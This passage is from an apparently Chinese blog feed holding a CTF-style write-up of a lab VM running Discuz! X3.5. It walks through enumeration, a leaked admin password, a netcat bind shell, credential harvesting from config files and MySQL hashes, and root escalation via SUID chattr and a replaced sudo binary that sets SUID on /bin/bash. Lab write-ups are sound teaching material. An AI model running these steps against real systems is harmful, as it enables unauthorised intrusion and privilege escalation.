http://192.168.2.69:80/home.php?mod=space&amp;amp;username=admin<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/home.php?mod=space&amp;amp;username=admin<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=misc&amp;action=showdarkroom<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=misc&amp;action=showdarkroom<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/home.php?mod=space&amp;amp;<span class="hljs-keyword">do</span>=friend&amp;amp;view=online&amp;amp;<span class="hljs-built_in">type</span>=member<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/home.php?mod=space&amp;amp;<span class="hljs-keyword">do</span>=friend&amp;amp;view=online&amp;amp;<span class="hljs-built_in">type</span>=member<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/home.php?mod=space&amp;username=admin<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/home.php?mod=space&amp;username=admin<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=forumdisplay&amp;fid=2<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=forumdisplay&amp;fid=2<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=forumdisplay&amp;fid=2<br>|     Form <span class="hljs-built_in">id</span>: moderate<br>|     Form action: forum.php?mod=topicadmin&amp;action=moderate&amp;fid=2&amp;infloat=<span class="hljs-built_in">yes</span>&amp;nopost=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=forumdisplay&amp;fid=2<br>|     Form <span class="hljs-built_in">id</span>: fastpostform<br>|_    Form action: forum.php?mod=post&amp;action=newthread&amp;fid=2&amp;topicsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;handlekey=fastnewpost<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-cross-domain-policy: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Cross-domain and Client Access policies.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       A cross-domain policy file specifies the permissions that a web client such as Java, Adobe Flash, Adobe Reader,</span><br><span class="hljs-string">|       etc. use to access data across different domains. A client acces policy file is similar to cross-domain policy</span><br><span class="hljs-string">|       but is used for M$ Silverlight applications. Overly permissive configurations enables Cross-site Request</span><br><span class="hljs-string">|       Forgery attacks, and may allow third parties to access sensitive data meant for the user.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       /crossdomain.xml:</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|         </span><br><span class="hljs-string">|     Extra information:</span><br><span class="hljs-string">|       Trusted domains:*</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html</span><br><span class="hljs-string">|       http://gursevkalra.blogspot.com/2013/08/bypassing-same-origin-policy-with-flash.html</span><br><span class="hljs-string">|       https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html</span><br><span class="hljs-string">|       http://acunetix.com/vulnerabilities/web/insecure-clientaccesspolicy-xml-file</span><br><span class="hljs-string">|       https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_%28OTG-CONFIG-008%29</span><br><span class="hljs-string">|_      https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-enum: <br>|   /admin.php: Possible admin folder<br>|   /robots.txt: Robots file<br>|_  /crossdomain.xml: Adobe Flash crossdomain policy<br>MAC Address: 08:00:27:EC:97:DA (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 58.26 seconds<br></code></pre></td></tr></table></figure><p>找到新的目录<code>/admin.php、/crossdomain.xml、/robots.txt</code></p><h2 id="3、WEB目录扫描"><a href="#3、WEB目录扫描" class="headerlink" title="3、WEB目录扫描"></a>3、WEB目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.69 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br><br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/index.php            (Status: 200) [Size: 12443]<br>/search.php           (Status: 200) [Size: 4988]<br>/home.php             (Status: 200) [Size: 9316]<br>/forum.php            (Status: 200) [Size: 12443]<br>/data                 (Status: 301) [Size: 311] [--&gt; http://192.168.2.69/data/]<br>/misc.php             (Status: 200) [Size: 33]<br>/static               (Status: 301) [Size: 313] [--&gt; http://192.168.2.69/static/]<br>/admin.php            (Status: 200) [Size: 2608]<br>/member.php           (Status: 200) [Size: 8954]<br>/portal.php           (Status: 200) [Size: 9039]<br>/template             (Status: 301) [Size: 315] [--&gt; http://192.168.2.69/template/]<br>/source               (Status: 301) [Size: 313] [--&gt; http://192.168.2.69/source/]<br>/group.php            (Status: 200) [Size: 9123]<br>/install              (Status: 301) [Size: 314] [--&gt; http://192.168.2.69/install/]<br>/api                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.69/api/]<br>/api.php              (Status: 200) [Size: 13]<br>/config               (Status: 301) [Size: 313] [--&gt; http://192.168.2.69/config/]<br>/connect.php          (Status: 200) [Size: 8944]<br>/robots.txt           (Status: 200) [Size: 639]<br>/plugin.php           (Status: 200) [Size: 8950]<br>/archiver             (Status: 301) [Size: 315] [--&gt; http://192.168.2.69/archiver/]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1345151 / 1764488 (76.23%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 1345530 / 1764488 (76.26%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h1 id="二、漏洞渗透"><a href="#二、漏洞渗透" class="headerlink" title="二、漏洞渗透"></a>二、漏洞渗透</h1><h2 id="1、WEB信息泄露"><a href="#1、WEB信息泄露" class="headerlink" title="1、WEB信息泄露"></a>1、WEB信息泄露</h2><p>访问80端口，发现是<code>Discuz! X3.5论坛</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508211545511.png"></p><p>在<code>在线会员</code>模块中存在一个账户<code>admin</code>，同时在<code>默认板块</code>有一篇文章<code>Let&#39;s Encrypt</code>，查看该文章发现是一段摩斯编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.--. .- ... ... .-- --- .-. -.. .---- ..--- ...--<br></code></pre></td></tr></table></figure><p>解密摩斯编码，得到明文<code>password123</code><br>    <strong>注意</strong>：摩斯密码本身不区分字母大小写，因此在实际爆破或登录尝试时，需要考虑所有可能的大小写组合，如 <code>password123</code>, <code>Password123</code>, <code>PASSWORD123</code> 等。</p><h2 id="2、获取WEB管理后台"><a href="#2、获取WEB管理后台" class="headerlink" title="2、获取WEB管理后台"></a>2、获取WEB管理后台</h2><p>使用获取到的凭证<code>admin:password123</code>，成功登录到管理后台<br>在用户界面，找到<code>管理中心</code>入口，再次输入密码进行管理后台<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508211553581.png"></p><h2 id="3、获取www-data权限"><a href="#3、获取www-data权限" class="headerlink" title="3、获取www-data权限"></a>3、获取www-data权限</h2><p>由于论坛的版本为<code>Discuz! X3.5</code>，搜索后未发现漏洞<br>查看管理中心界面，在<strong>工具</strong>-<strong>计划任务</strong>，找到一个<code>shell.php</code>的自定义任务<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508211557762.png"></p><p>尝试编辑该任务，发现无法直接修改其内容，尝试直接执行该任务<br>执行成功后再次使用<code>nmap</code>扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.69                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 16:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> chat.dsz (192.168.2.69)<br>Host is up (0.00018s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>12345/tcp open  netbus<br>MAC Address: 08:00:27:E6:8D:F4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.54 seconds<br></code></pre></td></tr></table></figure><p>发现新开放了一个端口<code>12345</code>，服务为<code>netbus</code></p><p>尝试直接进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc 192.168.2.69 12345                 <br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>成功获取到<code>www-data</code>权限</p><p>获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1、获取discuz权限"><a href="#1、获取discuz权限" class="headerlink" title="1、获取discuz权限"></a>1、获取discuz权限</h2><h3 id="1-数据库配置信息"><a href="#1-数据库配置信息" class="headerlink" title="1.数据库配置信息"></a>1.数据库配置信息</h3><p>在网站目录下面找到数据库的配置文件，在<code>/config</code>下面找到配置文件<code>config_global.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Chat2:/var/www/html/config$ <span class="hljs-built_in">cat</span> config_global.php <br>...<br>// ----------------------------  CONFIG DB  ----------------------------- //<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;dbhost&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;dbuser&#x27;</span>] = <span class="hljs-string">&#x27;discuz_user&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;dbpw&#x27;</span>] = <span class="hljs-string">&#x27;StrongPassword!123&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;dbcharset&#x27;</span>] = <span class="hljs-string">&#x27;utf8mb4&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;pconnect&#x27;</span>] = 0;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;dbname&#x27;</span>] = <span class="hljs-string">&#x27;discuz_db&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][1][<span class="hljs-string">&#x27;tablepre&#x27;</span>] = <span class="hljs-string">&#x27;maze_&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;common&#x27;</span>][<span class="hljs-string">&#x27;slave_except_table&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;common&#x27;</span>][<span class="hljs-string">&#x27;engine&#x27;</span>] = <span class="hljs-string">&#x27;innodb&#x27;</span>;<br>...<br></code></pre></td></tr></table></figure><p>发现数据库的用户名<code>discuz_user</code>和密码<code>StrongPassword!123</code></p><h3 id="2-数据库信息利用"><a href="#2-数据库信息利用" class="headerlink" title="2.数据库信息利用"></a>2.数据库信息利用</h3><p>使用该凭证进入数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Chat2:/var/www/html/config$ mysql -u discuz_user -p<span class="hljs-string">&#x27;StrongPassword!123&#x27;</span><br>Welcome to the MariaDB monitor.  Commands end with ; or \g. -p<span class="hljs-string">&#x27;StrongPassword!123&#x27;</span> <br>Your MariaDB connection <span class="hljs-built_in">id</span> is 104<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| discuz_db          |<br>| information_schema |<br>| mysql              |<br>+--------------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><p>在<code>mysql</code>数据库中找到相关的<code>user</code>和<code>password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [mysql]&gt; <span class="hljs-keyword">select</span> user,password from user;<br>+-------------+-------------------------------------------+<br>| User        | Password                                  |<br>+-------------+-------------------------------------------+<br>| mariadb.sys |                                           |<br>| root        | invalid                                   |<br>| mysql       | invalid                                   |<br>| discuz_user | *CF0058A6F9B624591DDA643E26A401BEBAD3DFD8 |<br>| hackme      | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 |<br>+-------------+-------------------------------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><p>使用MD5在线工具进行解密<br><code>CF0058A6F9B624591DDA643E26A401BEBAD3DFD8</code>无法解密<br><code>FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2</code>解密为<code>root123</code></p><h3 id="3-获取discuz权限"><a href="#3-获取discuz权限" class="headerlink" title="3.获取discuz权限"></a>3.获取discuz权限</h3><p>尝试使用密码进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Chat2:/var/www/html$ su discuz<br>Password: <br>discuz@Chat2:/var/www/html$ <span class="hljs-built_in">id</span><br>uid=1000(discuz) gid=1000(discuz) <span class="hljs-built_in">groups</span>=1000(discuz)<br></code></pre></td></tr></table></figure><p>成功获取到<code>discuz</code>的权限</p><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><h3 id="1-SUID提权向量与文件属性"><a href="#1-SUID提权向量与文件属性" class="headerlink" title="1.SUID提权向量与文件属性"></a>1.SUID提权向量与文件属性</h3><p>查看该用户拥有的 <code>sudo</code> 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:/var/www/html$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> discuz on Chat2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User discuz may run the following commands on Chat2:<br>    (ALL) NOPASSWD: /home/discuz/chat<br></code></pre></td></tr></table></figure><p><code>discuz</code> 用户可以无密码以root权限执行其家目录下的 <code>chat</code> 程序</p><p>查找具有SUID权限位的二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:/var/www/html$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/chattr<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p> <code>/usr/bin/chattr</code> 命令被设置了SUID位</p><p>主要思路是替换 <code>/home/discuz/chat</code> 文件为一个恶意脚本，然后通过 <code>sudo</code> 执行它来提权</p><ol><li><p>尝试重命名或删除<code>chat</code>文件时，发现没有权限进行，作为 <code>discuz</code> 用户，对自己家目录下的文件应该有写权限，这通常意味着文件被设置了特殊的扩展属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ <span class="hljs-built_in">mv</span> chat chat.bak<br><span class="hljs-built_in">mv</span>: cannot move <span class="hljs-string">&#x27;chat&#x27;</span> to <span class="hljs-string">&#x27;chat.bak&#x27;</span>: Operation not permitted<br></code></pre></td></tr></table></figure></li><li><p>使用<code>lsattr</code>查看文件属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ lsattr chat <br>----i---------e---- chat<br></code></pre></td></tr></table></figure><p> <code>lsattr</code> 命令用于查看文件的扩展属性。这里的 <code>i</code> 属性（immutable）意味着该文件被“锁定”，即便是root用户也无法修改、删除、重命名或创建链接。</p></li></ol><h3 id="2-替换文件并提权"><a href="#2-替换文件并提权" class="headerlink" title="2.替换文件并提权"></a>2.替换文件并提权</h3><p>提权思路：</p><ul><li>利用带SUID的 <code>/usr/bin/chattr</code> 移除 <code>/home/discuz/chat</code> 的 <code>i</code> 属性。</li><li>将 <code>/home/discuz/chat</code> 替换为我们自己的恶意脚本。</li><li>通过 <code>sudo</code> 执行修改后的 <code>chat</code> 脚本，以root权限完成提权。<br>  构造的恶意脚本功能是为 <code>/bin/bash</code> 添加SUID权限位，这样我们就能随时通过 <code>bash -p</code> 获取一个root shell</li></ul><ol><li><p>利用SUID chattr移除 i 属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ /usr/bin/chattr -i chat<br></code></pre></td></tr></table></figure></li><li><p>备份原文件并创建恶意脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ <span class="hljs-built_in">mv</span> chat chat.bak<br>discuz@Chat2:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span> &gt; chat<br>discuz@Chat2:~$ <span class="hljs-built_in">chmod</span> +x chat<br></code></pre></td></tr></table></figure></li><li><p>检查 &#x2F;bin&#x2F;bash 当前权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure></li><li><p>使用sudo执行我们的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ <span class="hljs-built_in">sudo</span> /home/discuz/chat<br></code></pre></td></tr></table></figure></li><li><p>再次检查 &#x2F;bin&#x2F;bash 权限，确认SUID位已添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure><p> <code>/bin/bash</code> 已经拥有了 <code>rws</code> 权限，SUID位设置成功。</p></li></ol><h3 id="3-获取root权限"><a href="#3-获取root权限" class="headerlink" title="3.获取root权限"></a>3.获取root权限</h3><p>执行 <code>bash -p</code> 命令，利用SUID权限获得一个 euid 为 0 (root) 的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">discuz@Chat2:~$ bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(discuz) gid=1000(discuz) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(discuz)<br></code></pre></td></tr></table></figure><h1 id="四、获取FLAG"><a href="#四、获取FLAG" class="headerlink" title="四、获取FLAG"></a>四、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /home/discuz/user.txt /root/root.txt <br>flag&#123;user-41352be6a84e5910fdef6afec4e41617&#125;<br>flag&#123;root-099177104a7291ba00f83ab188987c5d&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
      <tag>提取-suid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dragon</title>
    <link href="/Thehackerslabs/Dragon/"/>
    <url>/Thehackerslabs/Dragon/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://labs.thehackerslabs.com/machine/124">https://labs.thehackerslabs.com/machine/124</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00034s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00028s latency).<br>MAC Address: 08:00:27:4F:8B:03 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00070s latency).<br>MAC Address: 08:00:27:93:AF:C2 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.05 